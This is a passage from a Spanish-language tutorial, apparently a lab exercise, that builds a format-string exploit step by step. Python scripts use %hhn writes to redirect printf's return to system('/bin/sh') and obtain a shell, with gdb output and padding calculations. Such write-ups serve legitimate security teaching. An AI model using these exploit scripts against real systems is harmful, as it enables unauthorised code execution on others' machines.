<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>                       <span class="c">#lo imprime %100x</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_1</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"CCCC"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_2</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"DDDD"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_3</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"EEEE"</span>
   
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">114</span>
   
<span class="c">#low_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%100</span><span class="s">x"</span>                       <span class="c">#cant. bytes procesados: 0x46f</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                        <span class="c">#escribe ret_addr_byte_0</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <p>El primer especificador <code class="highlighter-rouge">%100x</code> nos va a permitir -cambiando su padding- modificar el número que escribimos en el byte menos significativo de la dirección de retorno.</p>

    <p>Observamos el valor que obtenemos con ese padding arbitrario de <code class="highlighter-rouge">100</code>, poniendo un breakpoint en la instrucción <code class="highlighter-rouge">ret</code> dentro de <code class="highlighter-rouge">printf</code> y viendo el nuevo valor almacenado:
 <code class="highlighter-rouge">shell_session
 (gdb) r "$(./exploit.py)"
 (gdb) si
 0x080482d0 in printf@plt ()
 (gdb) x/10i $eip
          0xb7e71c63 &lt;__printf+19&gt;:  mov    DWORD PTR [esp+0x8],eax
          0xb7e71c67 &lt;__printf+23&gt;:  mov    eax,DWORD PTR [esp+0x20]
          0xb7e71c6b &lt;__printf+27&gt;:  mov    DWORD PTR [esp+0x4],eax
          0xb7e71c6f &lt;__printf+31&gt;:  mov    eax,DWORD PTR [ebx-0x70]
          0xb7e71c75 &lt;__printf+37&gt;:  mov    eax,DWORD PTR [eax]
          0xb7e71c77 &lt;__printf+39&gt;:  mov    DWORD PTR [esp],eax
          0xb7e71c7a &lt;__printf+42&gt;:  call   0xb7e68290 &lt;_IO_vfprintf_internal&gt;
          0xb7e71c7f &lt;__printf+47&gt;:  add    esp,0x18
          0xb7e71c82 &lt;__printf+50&gt;:  pop    ebx
 break =&gt; 0xb7e71c83 &lt;__printf+51&gt;:  ret                        ; detenemos antes de que printf retorne
 (gdb) break *0xb7e71c83		
 (gdb) r "$(./exploit.py)"
</code></p>

    <p>Y al llegar al breakpoint, inspeccionamos la pila y observamos el nuevo valor del byte menos significativo de la dirección de retorno :</p>

    <p><img src="imagenes/e1/5-gdb.png" alt="gdb" /></p>

    <p>Vemos como el valor pasa de ser: <code class="highlighter-rouge">0xbffe70c0:	0x0804840c</code>, a ser: <code class="highlighter-rouge">0xbffe70c0:	0x08048487</code>.</p>

    <p>Entonces sabemos que con un padding -arbitrario- de <code class="highlighter-rouge">100</code> escribimos en el byte menos significativo de <code class="highlighter-rouge">ret_addr</code> el número <code class="highlighter-rouge">0x87</code> o 135 en decimal.</p>
  </li>
  <li>
    <p>Realizamos cálculos para lograr el número deseado (recordando que la dirección de <code class="highlighter-rouge">system()</code> es <code class="highlighter-rouge">0xb7e633e0</code>). En este caso debemos escribir <code class="highlighter-rouge">0xe0</code> o 224 en decimal, que corresponde al byte menos significativo de la dirección de <code class="highlighter-rouge">system()</code>.</p>

    <p>Para los cálculos es de utilidad la fórmula:</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#Fórmula para el cálculo del padding</span>
<span class="n">nro</span> <span class="n">deseado</span> <span class="o">-</span> <span class="n">nro</span> <span class="n">obtenido</span> <span class="o">+</span> <span class="n">padding_anterior</span> <span class="o">=</span> <span class="n">padding_nuevo</span>
</code></pre>    </div>
    <p>En este caso:
   <code class="highlighter-rouge">python
   #low_byte
   (nro deseado  - nro obtenido) + padding_anterior = padding_nuevo
   (0xe0 - 0x87) + 100 = ???
   (224 - 135)   + 100 = 189    ; 189 este es el padding necesario para lograr 0xe0
  </code></p>

    <p>Siguiendo la fórmula, reemplazamos en <code class="highlighter-rouge">exploit.py</code> el padding anterior de <code class="highlighter-rouge">100</code> por el nuevo padding <code class="highlighter-rouge">189</code> y obtenemos el resultado deseado en el byte menos significativo de la dirección de retorno:
   <code class="highlighter-rouge">python
   #low_byte
   exploit += "%189x"                      #cant. bytes procesados: 0xe0
   exploit += "%hhn"                       #escribe ret_addr_byte_0
  </code>
   <img src="imagenes/e1/6-gdb.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Realizamos el mismo proceso para para el resto de los bytes. Primero con un padding arbitrario vemos qué número escribimos en el byte correspondiente de la dirección de retorno. Y luego siguiendo la fórmula modificamos el padding para hacer una escritura con el número adecuado.
Hasta finalmente sobreescribir correctamente los cuatro bytes de la dirección de retorno de <code class="highlighter-rouge">printf()</code> para que al retornar salte a <code class="highlighter-rouge">system()</code> y no a <code class="highlighter-rouge">main()</code>.</p>

    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
    
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
    
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
    
<span class="n">ret_addr</span>     <span class="o">=</span> <span class="mh">0xbffe70c0</span>
<span class="c">#system_addr = 0xb7e633e0</span>
    
<span class="n">ret_addr_byte_0</span> <span class="o">=</span> <span class="n">ret_addr</span>              <span class="c"># low byte: 0x0c</span>
<span class="n">ret_addr_byte_1</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">1</span>          <span class="c"># 2nd byte: 0x84</span>
<span class="n">ret_addr_byte_2</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">2</span>          <span class="c"># 3rd byte: 0x04</span>
<span class="n">ret_addr_byte_3</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">3</span>          <span class="c">#high byte: 0x08</span>
    
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"A"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_0</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>                       
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_1</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"CCCC"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_2</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"DDDD"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_3</span><span class="p">)</span>  <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"EEEE"</span>
    
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">114</span>
    
<span class="c">#low_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%189</span><span class="s">x"</span>                      <span class="c">#cant. bytes procesados: 0xe0</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#escribe ret_addr_byte_0</span>
     
<span class="c">#2do_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%83</span><span class="s">x"</span>                       <span class="c">#cant. bytes: 0x33</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_1</span>
    
<span class="c">#3er_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%179</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xe6 </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_2</span>
        
<span class="c">#high_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%209</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xb7</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_3</span>
        
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <blockquote>
      <p><strong>Consideraciones</strong>:</p>
    </blockquote>

    <blockquote>
      <p>Si por el cálculo obtenemos un número negativo como padding, incluimos un 1 delante del número deseado (como descartamos el carry logramos el cometido). Por ejemplo, en el segundo byte de la dirección de retorno queremos escribir <code class="highlighter-rouge">0x33</code> pero los cálculos nos devuelven un padding negativo, para calcularlo usamos entonces el número <code class="highlighter-rouge">0x133</code> en vez de <code class="highlighter-rouge">0x33</code> y descartamos el carry.</p>
    </blockquote>

    <blockquote>
      <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#Fórmula para el cálculo del padding       </span>
<span class="o">&gt;</span>
<span class="c">#2do_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x"</span>                       <span class="c">#cant. bytes procesados deseados: 0xe8</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#escribe ret_addr_byte_1</span>
</code></pre>      </div>
      <p>Probamos con un padding de <code class="highlighter-rouge">08</code> y procesamos una cantidad de bytes <code class="highlighter-rouge">0xe8</code>.
<img src="imagenes/e1/7-gdb.png" alt="gdb" /></p>

      <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#Fórmula para el cálculo del padding</span>

<span class="c">#versión 1: 2do_byte</span>
<span class="p">(</span><span class="n">nro</span> <span class="n">deseado</span> <span class="o">-</span> <span class="n">nro</span> <span class="n">obtenido</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding_anterior</span> <span class="o">=</span> <span class="n">padding_nuevo</span>
<span class="p">(</span><span class="mh">0x33</span> <span class="o">-</span> <span class="mh">0xe8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">=</span> <span class="err">???</span> <span class="n">NEGATIVO</span>

<span class="c">#version correcta: 2do_byte</span>
<span class="p">(</span><span class="n">nro</span> <span class="n">deseado</span> <span class="o">-</span> <span class="n">nro</span> <span class="n">obtenido</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding_anterior</span> <span class="o">=</span> <span class="n">padding_nuevo</span>
<span class="p">(</span><span class="mh">0x133</span> <span class="o">-</span> <span class="mh">0xe8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">=</span> <span class="err">???</span>       <span class="p">;</span> <span class="n">reemplazamos</span> <span class="mh">0x33</span> <span class="n">por</span> <span class="mh">0x133</span>
<span class="p">(</span><span class="mi">307</span> <span class="o">-</span> <span class="mi">232</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">=</span> <span class="mi">83</span>           <span class="p">;</span> <span class="n">logramos</span> <span class="n">calcular</span> <span class="n">el</span> <span class="n">padding</span>
 <span class="sb">``</span><span class="err">`</span>

<span class="n">Y</span> <span class="n">con</span> <span class="n">un</span> <span class="n">padding</span> <span class="n">de</span> <span class="sb">`83`</span> <span class="n">obtenemos</span> <span class="n">el</span> <span class="n">resultado</span> <span class="n">deseado</span><span class="p">:</span>
<span class="sb">``</span><span class="err">`</span><span class="n">python</span>
<span class="c">#2do_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%83</span><span class="s">x"</span>                       <span class="c">#cant. bytes procesados deseados: 0x33</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#escribe ret_addr_byte_1</span>
</code></pre>      </div>
    </blockquote>

    <p>Finalmente, logramos sobreescribir correctamente los cuatro bytes de la dirección de retorno con el valor de <code class="highlighter-rouge">system</code> en <code class="highlighter-rouge">libc</code> (<code class="highlighter-rouge">0xb7e633e0</code>):</p>

    <p><img src="imagenes/e1/8-gdb.png" alt="gdb" /></p>

    <p>Y logramos un salto a <code class="highlighter-rouge">system()</code>:</p>

    <p><img src="imagenes/e1/9-gdb.png" alt="gdb" /></p>

    <p>El layout de la pila resultante es el siguiente:</p>

    <p><img src="imagenes/e1/parametro6.png" alt="pila" /></p>
  </li>
</ol>

<p><strong>Cuarta parte</strong>: para que el llamado a <code class="highlighter-rouge">system()</code> nos devuelva una shell, esta función debe tener como argumento el string <code class="highlighter-rouge">/bin/sh</code>.</p>

<p>Dado que el llamado a <code class="highlighter-rouge">system()</code> no se hizo con una instrucción <code class="highlighter-rouge">call</code> sino que se logró modificando una dirección de retorno de otra función, es necesario cumplir con la expectativa de <code class="highlighter-rouge">system()</code> en relación a la pila. Siguiendo la convención del llamado a funciones, <code class="highlighter-rouge">system()</code> espera en el tope de la pila una dirección de retorno (<code class="highlighter-rouge">ret_addr_after_sys</code>) y antes su argumento.    <br />
Ese estado de la pila es el que hay que construir a mano, para ubicar el string <code class="highlighter-rouge">/bin/sh</code> en el lugar indicado y cuando la ejecución salte a <code class="highlighter-rouge">system()</code> esta función identifique a ese string como su argumento.</p>

<p><img src="imagenes/llamado-sys.png" alt="gdb" /></p>

<blockquote>
  <p><strong>Consideraciones</strong>:   <br />
La dirección de retorno <code class="highlighter-rouge">ret_addr_after_sys</code> no nos interesa en este momento (únicamente la tenemos en cuenta para saltearla). No obstante, si se controlan las sucesivas direcciones de retorno es posible encadenar varias llamadas a funciones o incluso otro tipo de <code class="highlighter-rouge">gadgets</code>, de ahí el nombre de <code class="highlighter-rouge">return-oriented programming</code>.</p>
</blockquote>

<ol>
  <li>
    <p>Seguimos el mismo procedimiento pero esta vez para almacenar la dirección de <code class="highlighter-rouge">/bin/sh</code> (antes vimos que era <code class="highlighter-rouge">0xb7f84551</code>) en la posición exacta en la pila dónde <code class="highlighter-rouge">system()</code> buscará su argumento (<code class="highlighter-rouge">ret_addr + 8 = 0xbffe70c8</code>).</p>

    <p>Y finalmente el exploit resultante es:</p>

    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./e1 "$(./exploit.py)" """</span>
    
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
    
<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100000</span><span class="p">)[:</span><span class="mi">100000</span><span class="p">]</span>
    
<span class="n">ret_addr</span>     <span class="o">=</span> <span class="mh">0xbffe70c0</span>
<span class="n">arg_sys_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">8</span>                     <span class="c">#0xbffe70c8</span>
    
<span class="c">#system_addr = 0xb7e633e0</span>
<span class="c">#bin_sh_addr = 0xb7f84551</span>
    
<span class="n">ret_addr_byte_0</span> <span class="o">=</span> <span class="n">ret_addr</span>                      <span class="c">#low byte</span>
<span class="n">ret_addr_byte_1</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">ret_addr_byte_2</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">ret_addr_byte_3</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">+</span> <span class="mi">3</span>                  <span class="c">#high byte</span>
    
<span class="n">arg_sys_addr_byte_0</span>  <span class="o">=</span> <span class="n">arg_sys_addr</span>             <span class="c">#low</span>
<span class="n">arg_sys_addr_byte_1</span>  <span class="o">=</span> <span class="n">arg_sys_addr</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">arg_sys_addr_byte_2</span>  <span class="o">=</span> <span class="n">arg_sys_addr</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">arg_sys_addr_byte_3</span>  <span class="o">=</span> <span class="n">arg_sys_addr</span> <span class="o">+</span> <span class="mi">3</span>         <span class="c">#high   </span>
    
<span class="c">#ret_addr de printf()</span>
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"A"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_0</span><span class="p">)</span>          <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"BBBB"</span>                               <span class="c">#%x</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_1</span><span class="p">)</span>          <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"CCCC"</span>                               <span class="c">#%x</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_2</span><span class="p">)</span>          <span class="c">#%hhn                               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"DDDD"</span>                               <span class="c">#%x                                 </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_byte_3</span><span class="p">)</span>          <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"EEEE"</span>                               <span class="c">#%x</span>
    
<span class="c">#argumento de system()                  </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"FFFF"</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">arg_sys_addr_byte_0</span><span class="p">)</span>      <span class="c">#%hhn</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"GGGG"</span>                               <span class="c">#%x                                 </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">arg_sys_addr_byte_1</span><span class="p">)</span>      <span class="c">#%hhn                               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"HHHH"</span>                               <span class="c">#%x                                 </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">arg_sys_addr_byte_2</span><span class="p">)</span>      <span class="c">#%hhn                               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"IIII"</span>                               <span class="c">#%x                                 </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">arg_sys_addr_byte_3</span><span class="p">)</span>      <span class="c">#%hhn                               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"JJJJ"</span>                                                                   
    
<span class="c">#padding</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x."</span> <span class="o">*</span> <span class="mi">114</span>                
    
<span class="c">#calculo system() addr                                                              </span>
<span class="c">#low_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%189</span><span class="s">x"</span>                      <span class="c">#cant. bytes procesados: 0xe0               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#escribe ret_addr_byte_0                    </span>
<span class="c">#2do_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%83</span><span class="s">x"</span>                       <span class="c">#cant. bytes: 0x33                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_1                            </span>
<span class="c">#3er_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%179</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xe6                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_2                            </span>
<span class="c">#high_byte </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%209</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xb7                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#ret_addr_byte_3                            </span>
                                                                                        
<span class="c">#calculo /bin/sh addr </span>
<span class="c">#low_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%154</span><span class="s">x"</span>                      <span class="c">#cant. bytes procesados: 0x51               </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#escribe arg_sys_addr_byte_0                </span>
<span class="c">#2do_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%244</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0x45                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#arg_sys_addr_byte_1                        </span>
<span class="c">#3er_byte</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%179</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xf8                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#arg_sys_addr_byte_2                        </span>
<span class="c">#high_byte </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%191</span><span class="s">x"</span>                      <span class="c">#cant. bytes: 0xb7                          </span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">hhn"</span>                       <span class="c">#arg_sys_addr_byte_3                        </span>
    
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
</code></pre>    </div>

    <p>Y al ejecutarlo logramos llamar a <code class="highlighter-rouge">system("/bin/sh")</code> y obtenemos una shell.</p>

    <p><img src="imagenes/e1/11-gdb.png" alt="gdb" /></p>
  </li>
</ol>

<h3 id="cmo-seguir">¿Cómo seguir?</h3>

<ol>
  <li><strong>Usar variables de entorno</strong>: plantear un ataque alternativo a <strong>E1</strong> almacenando <code class="highlighter-rouge">/bin/sh</code> en una variable de entorno.</li>
</ol>


</div>

    </div>

  </body>
</html>
